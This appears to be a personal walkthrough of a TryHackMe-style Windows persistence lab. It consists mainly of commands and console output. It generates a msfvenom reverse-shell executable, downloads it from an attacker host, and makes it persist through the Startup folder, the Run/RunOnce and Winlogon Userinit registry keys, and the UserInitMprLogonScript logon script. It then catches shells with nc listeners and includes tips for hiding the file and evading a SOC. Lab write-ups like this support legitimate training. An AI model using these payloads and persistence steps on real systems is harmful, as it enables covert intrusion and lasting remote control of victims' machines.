Create Payload
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe -o revshell.exe
```

Next we pull the payload from our box a simple python host works or use *Secure GO app* - TODO
```bash
python3 -m http.server 
```

From the host pull the file
```powershell
wget http://10.11.93.71:8000/revshell.exe -O revshell.exe
```

Now we are going to store it into our Startup
```powershell
copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Now we log out of the Session and Reconnect with RDP. Run the flag exe(10)
```powershell
C:\Windows\system32>C:\flags\flag10.exe
C:\flags\flag10.exe
THM{NO_NO_AFTER_YOU}
```


### Run / Runonce
This is registry modification. I chose `HKLM Run` since I already had an Admin session.
```powershell
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

Since we are lazy lets take the same payload from flag 10 and make it work for us in this

```powershell
cp .\revshell.exe C:\Windows\
```
Now that we have our shell in a more sneaky spot. Log out of the RDP(*Note you must logout to make it trigger. Closing alone didn't seem to work*) In an engagement may be worth waiting a few minutes before logging back in to appear benign to SOC

```powershell
*Wait a couple of seconds for the executable to trigger*

C:\Windows\system32>C:\flags\flag11.exe
C:\flags\flag11.exe
THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}

```

### Winlogon
An alternative to the `Run/Runonce` is to use Winlogon. This loads user profile right after authentication.

Again we will use the same payload that we moved into C:\Windows ***No action necessary for this payload***

Modify the registry keys for Winlogon to use the original and the new payload executable by appending a comma  to the value. If we modify the original executable, we may break the system(logon sequence)
```powershell
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
	shell or Userinit

C:\Windows\system32\userinit.exe,C:\Windows\revshell.exe
```

We get a shell almost immediately following a logoff/logon
```bash
┌──(sstephens㉿kali-ppt)-[~]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.11.93.71] from (UNKNOWN) [10.10.182.122] 49886
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\flags\flag12
C:\flags\flag12
THM{I_INSIST_GO_FIRST}
```


### Logon Scripts

> [!User Environment Variable]
> Since userinit.exe also looks for an environment variable called `UserInitMprLogonScript` we are going to abuse it :) 

Modify the following
```powershell
HKCU\Environment 
New > Expandable String > UserInitMprLogonScript

value = C:\Windows\revshell.exe
```

> [!NOTE]
> Use a new revshell & NC listener. Also, if you continue within the same session for this room, be sure to use a new name for your revshell as the flag13.exe will not run with the same name( clobbered by other exercises)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.93.71 LPORT=4453 -f exe -o revshell.exe
```

```powershell

┌──(sstephens㉿kali-ppt)-[~]
└─$ nc -lvnp 4453
listening on [any] 4453 ...
connect to [10.11.93.71] from (UNKNOWN) [10.10.182.122] 49964
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\flags\flag13.exe
C:\flags\flag13.exe
THM{USER_TRIGGERED_PERSISTENCE_FTW}

```